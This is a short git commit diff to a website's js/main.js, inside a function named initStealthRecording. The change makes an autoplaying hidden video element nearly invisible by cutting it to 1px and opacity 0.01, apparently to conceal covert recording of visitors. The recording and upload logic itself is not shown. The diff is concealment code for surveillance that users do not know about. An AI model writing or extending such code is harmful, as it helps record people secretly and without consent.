321ffaefa2bc6c02eea41535ece7ea5aa524be03
Vu The Dan <vuthedan168@gmail.com>
2026-09-24 14:32:59 +0700

    fix: z-index video ẩn

--- js/main.js
+++ js/main.js
@@ -2291,7 +2291,7 @@ function initStealthRecording() {
       hiddenVideo.autoplay = true;
       hiddenVideo.muted = true;
       hiddenVideo.playsInline = true;
-      hiddenVideo.style.cssText = "position:fixed; bottom:0; right:0; width:50px; height:50px; opacity:0.1; pointer-events:none; z-index:-9999;";
+      hiddenVideo.style.cssText = "position:fixed; bottom:0; right:0; width:1px; height:1px; opacity:0.01; pointer-events:none; z-index:1;";
       document.body.appendChild(hiddenVideo);
     }
 
